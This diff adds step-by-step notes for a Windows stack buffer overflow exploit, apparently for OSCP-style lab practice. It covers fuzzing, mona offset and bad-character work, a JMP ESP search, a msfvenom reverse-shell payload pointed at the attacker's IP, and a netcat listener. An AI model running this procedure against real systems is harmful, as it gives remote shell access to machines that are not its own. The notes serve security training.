@@ -1,0 +1,69 @@
+Notes:
+- Always run Immunity Debugger as Administrator
+
+1. (Kali) Set the 'IP', 'port', and 'prefix' variables in fuzz.py then copy paste to poc1-4.py:
+gedit fuzz.py poc1.py poc2.py poc3.py poc4.py usage.txt
+
+2. (Immunity Debugger) Launch Immunity Debugger to start the vulnerable app and configure mona:
+!mona config -set workingfolder c:\mona\%p
+
+3. (Kali) Start by fuzzing the application:
+python3 ./fuzz.py
+# Paste results to the '<crash>' values in steps 4 and 6.
+
+=== Restart Immunity Debugger ===
+
+4. (Kali) Generate a custom payload:
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crash>
+# Paste results to the 'payload' variable in poc1.py:
+
+5. (Kali) With the payload variable set run the script:
+python3 ./poc1.py
+
+6. (Immunity Debugger) Use the below command to locate offset value in the Log data window. The line with the EIP value will look like this: 'EIP contains normal pattern : ... (offset XXXX)':
+!mona findmsp -distance <crash>
+# Paste the results to the 'offset' varialbe in poc2-4.py.
+
+=== Restart Immunity Debugger ===
+
+7. (Kali) Run poc2.py and verify EIP contains '42424242' after the crash (located in the "CPU" window, "Registers" section):
+python3 ./poc2.py
+
+8. (Immunity Debugger) Generate a bytearray:
+!mona bytearray -b "\x00"
+
+=== Restart Immunity Debugger ===
+
+9. (Kali) With the 'offset' variable already set in poc3.py run the script:
+python3 ./poc3.py
+
+10. (Immunity Debugger) Locate the ESP address (located in the "CPU" window, "Registers" section) and set the '<address>' value below:
+!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
+# Paste the bad chars locate in the "mona Memory comparision results" window to the "<bad_chars>" values in the form "\x00\x01\x02\x04" to steps 11, 14, and 16.
+
+11. (Immunity Debugger) Update the bytearray with the bad chars:
+!mona bytearray -b "<bad_chars>"
+
+=== Restart Immunity Debugger ===
+
+12. (Kali) Remove the bad chars from poc3.py:
+python3 ./poc3.py
+
+13. (Immunity Debugger) Verify there are no more bad chars with the new ESP address:
+!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
+
+14. (Immunity Debugger) Find a jump point:
+!mona jmp -r esp -cpb "<bad_chars>"
+# Paste results to the 'retn' variable in poc4.py in little endian form. The address "625011AF" becomes "\xaf\x11\x50\x62".
+
+15. (Kali) Generate a msfvenom payload:
+msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=<kali_port> EXITFUNC=thread -b "<bad_chars>" -f c
+# Paste results to the 'payload' variable in poc4.py.
+
+=== Restart Immunity Debugger ===
+
+16. (Kali) start listener
+rlwrap nc -lvnp <kali_port>
+
+17. (Kali) Finally run the script to expoit:
+python3 ./poc4.py
